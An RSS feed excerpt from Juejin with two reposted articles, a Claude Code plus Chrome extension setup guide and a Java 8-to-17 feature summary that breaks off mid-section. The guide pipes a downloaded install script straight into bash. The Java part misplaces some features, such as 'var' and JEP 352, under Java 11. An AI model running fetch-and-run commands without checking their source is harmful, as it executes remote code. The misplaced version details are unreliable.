<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Claude Code + Chrome 集成：快速设置指南]]></title>    <link>https://juejin.cn/post/7589897523269468170</link>    <guid>https://juejin.cn/post/7589897523269468170</guid>    <pubDate>2026-01-01T14:26:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589897523269468170" data-draft-id="7589897523269419018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Claude Code + Chrome 集成：快速设置指南"/> <meta itemprop="keywords" content="Claude"/> <meta itemprop="datePublished" content="2026-01-01T14:26:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="是魔丸啊"/> <meta itemprop="url" content="https://juejin.cn/user/3217622495411292"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Claude Code + Chrome 集成：快速设置指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3217622495411292/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    是魔丸啊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T14:26:28.000Z" title="Thu Jan 01 2026 14:26:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.reddit.com%2Fr%2FClaudeAI%2Fcomments%2F1i4t6g9%2Fspent_this_weekend_with_claude_code_chrome%2F" target="_blank" title="https://www.reddit.com/r/ClaudeAI/comments/1i4t6g9/spent_this_weekend_with_claude_code_chrome/" ref="nofollow noopener noreferrer">转载</a></p>
<p>这个周末我一直在使用 Claude Code + Claude Chrome 集成。它真的让我惊叹。我想在使用它的同时分享这个快速设置指南。</p>
<h2 data-id="heading-0">它实际做什么</h2>
<p>Claude Code（终端版）连接到 Claude Chrome 浏览器扩展。所以你可以在终端中写代码，然后让 Claude 在 Chrome 中打开它，读取控制台错误，点击操作，并修复代码。所有这些都不需要复制粘贴任何东西。</p>
<p>现在 Claude 可以：</p>
<ul>
<li>在浏览器中打开 URL</li>
<li>点击按钮、填写表单</li>
<li>读取控制台错误和 DOM 状态</li>
<li>截图和录制 GIF</li>
<li>使用你现有的登录信息处理需要认证的网站（Gmail、Notion、Sheets）</li>
</ul>
<p>不需要 API。不需要 token。只需要你的浏览器会话。</p>
<h2 data-id="heading-1">前置要求</h2>
<p>在开始之前，你需要：</p>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> Google Chrome 浏览器</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 付费 Claude 账户（Pro、Team 或 Enterprise）</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> Claude in Chrome 浏览器扩展（版本 1.0.36 或更高）</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> Claude Code CLI（版本 2.0.73 或更高）</li>
</ul>
<p>⚠️ <strong>Windows 用户注意</strong>：WSL 不支持 Chrome 集成。请在常规 Windows 中运行 Claude Code。</p>
<h2 data-id="heading-2">设置步骤（5 分钟）</h2>
<h3 data-id="heading-3">步骤 1：安装 Claude Code 或更新</h3>
<p>打开终端并运行：</p>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://claude.ai/install.sh | bash
</code></pre>
<p>验证安装：</p>
<pre><code class="hljs language-bash" lang="bash">claude --version
</code></pre>
<p>如果版本不正确或已经安装，执行更新命令：</p>
<pre><code class="hljs language-bash" lang="bash">claude --update
</code></pre>
<h3 data-id="heading-4">步骤 2：安装 Chrome 浏览器扩展</h3>
<ol>
<li>打开 Chrome 并进入 Chrome 网上应用店</li>
<li>搜索"Claude"或使用直接链接</li>
<li>点击"添加到 Chrome"</li>
<li>点击工具栏中的拼图图标 → 找到 Claude → 点击固定</li>
<li>点击 Claude 图标并使用你的 Claude 账户登录</li>
</ol>
<h3 data-id="heading-5">步骤 3：连接 Claude Code 到 Chrome</h3>
<p>在终端中，使用 chrome 标志运行 Claude Code：</p>
<pre><code class="hljs language-bash" lang="bash">claude --chrome
</code></pre>
<p><code>--chrome</code> 标志告诉 Claude Code 连接到浏览器扩展。</p>
<h3 data-id="heading-6">步骤 4：验证连接</h3>
<p>在 Claude Code 内部，输入：</p>
<pre><code class="hljs language-bash" lang="bash">/chrome
</code></pre>
<p>你应该看到：<code>Chrome integration: Enabled</code>（Chrome 集成：已启用）</p>
<h2 data-id="heading-7">快速测试</h2>
<p>使用这个提示词测试：</p>
<blockquote>
<p>打开 google.com，点击搜索字段，输入"Claude Code tutorial"，告诉我出现什么自动补全建议。</p>
</blockquote>
<p>观察 Chrome 中的 Claude：</p>
<ul>
<li>打开 Google</li>
<li>点击搜索字段</li>
<li>输入查询</li>
<li>读取自动补全建议</li>
</ul>
<p>终端和浏览器已连接。</p>
<h2 data-id="heading-8">多站点自动化</h2>
<p>我需要你执行一个多站点工作流程：</p>
<ol>
<li>在 sheets.google.com 打开 Google Sheets</li>
<li>创建一个新的空白电子表格</li>
<li>将其重命名为"Latest AI News"</li>
<li>在第一行添加标题：Title、URL、Summary</li>
<li>在新标签页中打开 Hacker News（news.ycombinator.com）</li>
<li>提取前 10 个故事的标题和 URL</li>
<li>将它们格式化为 markdown 列表</li>
<li>回到 Google Sheet</li>
<li>用它们的信息添加为新行</li>
<li>完成后告诉我并给我 Sheet URL</li>
</ol>
<p>逐步完成这个任务。如果你遇到任何登录页面，让我知道，我会处理它们。</p>
<p><strong>Claude 会做什么</strong>：创建电子表格、搜索 LinkedIn、提取数据、填充行。</p>
<p>关键洞察：不需要 API。Claude 使用你现有的已登录浏览器会话。</p>
<h2 data-id="heading-9">限制</h2>
<p>当前约束：</p>
<ul>
<li>仅支持 Chrome（不支持 Arc、Firefox、Safari）</li>
<li>Windows 上不支持 WSL（参见下面的更新编辑）</li>
<li>无 headless 模式 — 浏览器必须可见</li>
<li>JavaScript 模态对话框（alert/confirm）可能会中断流程</li>
</ul>
<h2 data-id="heading-10">不应该用于：</h2>
<p>❌ 金融交易
❌ 密码管理
❌ 无人监督的生产部署</p>
<p><strong>记住</strong>：Claude 使用你的已登录会话。无论你登录什么，Claude 都可以访问。请监督它。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 8-25 各个版本新特性总结]]></title>    <link>https://juejin.cn/post/7589978645135622154</link>    <guid>https://juejin.cn/post/7589978645135622154</guid>    <pubDate>2026-01-01T14:41:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589978645135622154" data-draft-id="7589823928414568474" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 8-25 各个版本新特性总结"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2026-01-01T14:41:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一线大码"/> <meta itemprop="url" content="https://juejin.cn/user/3280598429340984"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 8-25 各个版本新特性总结
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3280598429340984/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一线大码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T14:41:34.000Z" title="Thu Jan 01 2026 14:41:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>本文所写的这几个 Java 版本均为长期支持（LTS）版本。</p>
<h2 data-id="heading-0">1. Java 8</h2>
<h3 data-id="heading-1">1.1. ‌Lambda 表达式</h3>
<p>Lambda 表达式允许你以一种更简洁的方式表示函数式接口的实例。它能够使代码更加简洁和易读。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 示例</span>
List&lt;String&gt; names = Arrays.asList(<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"Bob"</span>, <span class="hljs-string">"Charlie"</span>);
names.forEach(name -&gt; System.out.println(name));
</code></pre>
<h3 data-id="heading-2">1.2. 函数式接口</h3>
<p>函数式接口是只包含一个抽象方法的接口，可以使用 <code>@FunctionalInterface</code> 注解来标识。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FunctionalInterface</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyFunctionalInterface</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span>;
}
</code></pre>
<h3 data-id="heading-3">1.3. 方法引用</h3>
<p>方法引用是一种更简洁地表示 lambda 表达式的方法。可以使用类名或对象名来引用方法。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 示例</span>
List&lt;String&gt; names = Arrays.asList(<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"Bob"</span>, <span class="hljs-string">"Charlie"</span>);
names.forEach(System.out::println);
</code></pre>
<h3 data-id="heading-4">1.4. ‌Stream API</h3>
<p>Stream API 提供了一种高效处理集合的方式，通过流式操作可以进行过滤、映射、排序等操作。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 示例</span>
List&lt;String&gt; filteredNames = names.stream()
                                   .filter(name -&gt; name.startsWith(<span class="hljs-string">"A"</span>))
                                   .collect(Collectors.toList());
</code></pre>
<h3 data-id="heading-5">1.5. ‌Optional 类</h3>
<p>Optional 类用于防止空指针异常，它可以包含值或不包含值。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 示例</span>
Optional&lt;String&gt; optionalName = Optional.ofNullable(<span class="hljs-literal">null</span>);
optionalName.ifPresent(System.out::println); <span class="hljs-comment">// 不会输出任何内容</span>
</code></pre>
<h3 data-id="heading-6">1.6. ‌默认方法</h3>
<p>接口可以包含默认实现的方法，这样子类可以选择重写或者直接使用。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyInterface</span> {
    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defaultMethod</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"Hello from default method"</span>);
    }
}
</code></pre>
<h3 data-id="heading-7">1.7. ‌新日期时间 API</h3>
<p>Java 8 引入了新的日期时间 API 来替代旧的 java.util.Date 和 java.util.Calendar 类，提供更好的可读性和可用性。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 示例</span>
<span class="hljs-type">LocalDate</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> LocalDate.now();
System.out.println(today);
</code></pre>
<h3 data-id="heading-8">1.8. 重复注解</h3>
<p>Java 8 支持在同一位置上使用相同类型的注解多次。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@MyAnnotation</span>
<span class="hljs-meta">@MyAnnotation</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {
}
</code></pre>
<h2 data-id="heading-9">2. Java 11</h2>
<h3 data-id="heading-10">2.1. ‌局部变量类型推断</h3>
<p>引入 <code>var</code> 关键字，编译器自动推断局部变量类型，简化代码书写。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">var</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();  <span class="hljs-comment">// 类型自动推断为 ArrayList&lt;String&gt;</span>
<span class="hljs-type">var</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Java"</span>;                  <span class="hljs-comment">// 类型自动推断为 String</span>
</code></pre>
<ul>
<li><strong>语法</strong>‌：<code>var</code> 只能用于局部变量，编译器根据初始化值推断类型。</li>
<li>‌<strong>优势</strong>‌：减少样板代码，但需注意类型明确性。</li>
<li>‌<strong>限制</strong>‌：不能用于方法参数、返回值或类成员变量。</li>
</ul>
<h3 data-id="heading-11">2.2. ‌字符串方法增强</h3>
<p>Java 11 增加了一些新的字符串方法，改善了字符串操作的便利性。</p>
<ul>
<li>String.isBlank(): 判断字符串是否为空或仅包含空白字符。</li>
<li>String.lines(): 将字符串按行分割并返回流。</li>
<li>String.repeat(int count): 重复字符串指定次数。</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"   "</span>;
System.out.println(str.isBlank()); <span class="hljs-comment">// true</span>

<span class="hljs-type">String</span> <span class="hljs-variable">multiLine</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello\nWorld"</span>;
multiLine.lines().forEach(System.out::println); <span class="hljs-comment">// 输出每一行</span>

<span class="hljs-type">String</span> <span class="hljs-variable">repeated</span> <span class="hljs-operator">=</span> <span class="hljs-string">"abc"</span>.repeat(<span class="hljs-number">3</span>); <span class="hljs-comment">// "abcabcabc"</span>
</code></pre>
<h3 data-id="heading-12">2.3. ‌新 HTTP Client API</h3>
<p>Java 11 引入了新的 HTTP 客户端 API，支持 HTTP/2，能够以非阻塞方式发送请求和接收响应。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">HttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> HttpClient.newHttpClient();
<span class="hljs-type">HttpRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> HttpRequest.newBuilder()
        .uri(URI.create(<span class="hljs-string">"https://api.example.com"</span>))
        .build();

client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
      .thenApply(HttpResponse::body)
      .thenAccept(System.out::println);
</code></pre>
<h3 data-id="heading-13">2.4. 文件和目录的增强</h3>
<p>Files 类中增加了 readString() 和 writeString() 方法，使得读取和写入文件更加方便。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"example.txt"</span>);
Files.writeString(path, <span class="hljs-string">"Hello, World!"</span>); <span class="hljs-comment">// 写入文件</span>
<span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> Files.readString(path); <span class="hljs-comment">// 读取文件</span>
</code></pre>
<h3 data-id="heading-14">2.5. 弃用和删除不再使用的功能</h3>
<p>Java 11 删除了一些过时的API和功能，例如：</p>
<ul>
<li>移除 javax.xml.bind（JAXB）模块</li>
<li>移除 java.activation 模块</li>
</ul>
<h3 data-id="heading-15">2.6. ‌ZGC 垃圾收集器</h3>
<p>Java 11 引入了实验性的 ZGC（零停顿垃圾回收器），旨在处理大内存应用程序，以提供更低的停顿时间。</p>
<p>可伸缩、低延迟垃圾收集器，停顿时间≤10ms，适用于大堆内存场景。</p>
<pre><code class="hljs language-java" lang="java">java -XX:+UseZGC MyApp  <span class="hljs-comment">// 启用 ZGC</span>
</code></pre>
<ul>
<li>‌<strong>核心特性</strong>‌：并发处理、堆内存压缩，停顿时间≤10ms（实际≤1.68ms）。</li>
<li>‌<strong>适用场景</strong>‌：高吞吐量、低延迟应用（如金融系统）。ZGC 适用于大堆内存场景，但需 Linux/x64 平台。</li>
</ul>
<h3 data-id="heading-16">2.7. 运行时常量池</h3>
<p>Java 11 优化了常量池的实现，以减少内存占用并提高性能。</p>
<h3 data-id="heading-17">2.8. 增强的 JEP</h3>
<p>Java 11 包括多个 JEP，如：</p>
<p>JEP 318: Epsilon (无操作) 垃圾回收器
JEP 321: HTTP Client
JEP 352: Non-Volatile Mapped Byte Buffers</p>
<p>无操作垃圾收集器，适用于嵌入式系统。</p>
<pre><code class="hljs language-java" lang="java">java -XX:+UseEpsilonGC MyApp  <span class="hljs-comment">// 启用 Epsilon</span>
</code></pre>
<p>Java Flight Recorder（JFR），集成到 JVM，提供性能分析工具。</p>
<pre><code class="hljs language-java" lang="java">java -XX:+FlightRecorder MyApp  <span class="hljs-comment">// 启用 JFR</span>
</code></pre>
<h2 data-id="heading-18">3. Java 17</h2>
<h3 data-id="heading-19">3.1. ‌密封类（Sealed Classes）</h3>
<p>通过 <code>sealed</code> 关键字限制类的继承范围，增强封装性。</p>
<p>密封类允许开发者控制哪些类可以扩展或实现某个类或接口。通过这种方式，可以定义一个受限的继承层次结构。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span> <span class="hljs-keyword">permits</span> Circle, Square {}

<span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> {}
<span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Square</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> {}
</code></pre>
<h3 data-id="heading-20">3.2. ‌模式匹配（Pattern Matching for instanceof）</h3>
<p>Java 17 引入了对 instanceof 的模式匹配，简化了类型检查和强制转换的过程。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello, World!"</span>;
<span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> String s) {
    System.out.println(s.toUpperCase()); <span class="hljs-comment">// 直接使用 s，不需要再次强制转换</span>
}
</code></pre>
<h3 data-id="heading-21">3.3. 文本块（Text Blocks）</h3>
<p>虽然在 Java 13 和 Java 14 中引入了文本块，Java 17 将其正式标准化。文本块使得多行字符串的书写变得更加简单和可读。</p>
